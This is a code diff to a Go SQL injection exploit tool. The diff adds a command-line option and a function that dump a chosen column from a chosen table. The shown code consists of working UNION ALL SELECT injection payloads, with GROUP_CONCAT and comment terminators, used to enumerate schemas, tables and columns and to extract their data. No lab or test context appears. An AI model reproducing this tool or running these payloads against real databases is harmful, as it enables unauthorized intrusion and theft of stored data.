@@ -118,10 +118,17 @@ func columnExploit(exploit *Exploit, tableName string) Result {
 	return exploit.enumerateDatabase(payload)
 }
 
-func dataExploit(exploit *Exploit, tableName string, columnNames string) Result {
+func dataExploit(exploit *Exploit, tableName string, columnName string) Result {
 	fmt.Println("[+] Data Exploit --------------------------------------------------------------------------------------")
 
-	payload := fmt.Sprintf("7 UNION ALL SELECT 1,GROUP_CONCAT(%s),3,4,5,6,7 FROM %s; -- -", columnNames, tableName)
+	payload := fmt.Sprintf("7 UNION ALL SELECT 1,GROUP_CONCAT(%s),3,4,5,6,7 FROM %s; -- -", columnName, tableName)
+	return exploit.enumerateDatabase(payload)
+}
+
+func customExploit(exploit *Exploit, tableName string, columnName string) Result {
+	fmt.Println("[+] Data Exploit --------------------------------------------------------------------------------------")
+
+	payload := fmt.Sprintf("7 UNION ALL SELECT 1,%s,3,4,5,6,7 FROM %s; -- -", columnName, tableName)
 	return exploit.enumerateDatabase(payload)
 }
 
@@ -158,6 +165,7 @@ func main() {
 
 	schemaName := flag.String("s", "", "Enumerates tables from the schema name")
 	tableName := flag.String("t", "", "Enumerates columns from the table name")
+	columnName := flag.String("c", "", "Enumerates columns from the table name")
 	flag.Parse()
 
 	if *schemaName != "" {
@@ -165,12 +173,17 @@ func main() {
 		exploit.PrintResult(res)
 	}
 
-	if *tableName != "" {
+	if *tableName != "" && *columnName != "" {
+		res := customExploit(&exploit, *tableName, *columnName)
+		exploit.PrintResult(res)
+	}
+
+	if *tableName != "" && *columnName == "" {
 		res := columnExploit(&exploit, *tableName)
 		exploit.PrintResult(res)
 
-		columnNames := formatColumnNames(res.result)
-		res = dataExploit(&exploit, *tableName, columnNames)
+		*columnName = formatColumnNames(res.result)
+		res = dataExploit(&exploit, *tableName, *columnName)
 		exploit.PrintResult(res)
 	}
 }
